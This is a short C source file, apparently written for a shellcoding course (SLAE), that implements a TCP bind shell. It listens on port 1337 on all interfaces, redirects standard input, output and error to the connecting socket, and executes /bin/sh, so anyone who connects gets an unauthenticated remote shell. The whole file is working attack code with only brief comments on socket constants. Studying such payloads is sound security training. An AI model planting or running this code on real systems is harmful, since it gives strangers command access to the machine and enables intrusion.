/*
 * Title: Shell Bind TCP (default Port: 1337)
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
*/

#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

#define PORT	1337
#define STDIN	0
#define STDOUT	1
#define STDERR	2

int
main(void)
{
	int clientfd, sockfd;
	int dstport = PORT;
	struct sockaddr_in mysockaddr;

	/*
	 * $ grep /usr/include/AF_INET i386-linux-gnu/bits/socket.h
	 *   #define AF_INET		PF_INET
	 * $ grep grep SOCK_STREAM /usr/include/i386-linux-gnu/bits/socket_type.h
	 *   SOCK_STREAM = 1,		// Sequenced, reliable, connection-based
	*/
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	/*
	 * $ grep PF_INET /usr/include/i386-linux-gnu/bits/socket.h
	 *   #define PF_INET	2	// IP protocol family.
	*/
	mysockaddr.sin_family = AF_INET;         // 0x00000002
	mysockaddr.sin_port = htons(dstport);
	mysockaddr.sin_addr.s_addr = INADDR_ANY; // 0x00000000

	bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

	listen(sockfd, 0);

	clientfd = accept(sockfd, NULL, NULL);

	dup2(clientfd, STDIN);  // 0
	dup2(clientfd, STDOUT); // 1
	dup2(clientfd, STDERR); // 2

	execve("/bin/sh", NULL, NULL);
	return 0;
}
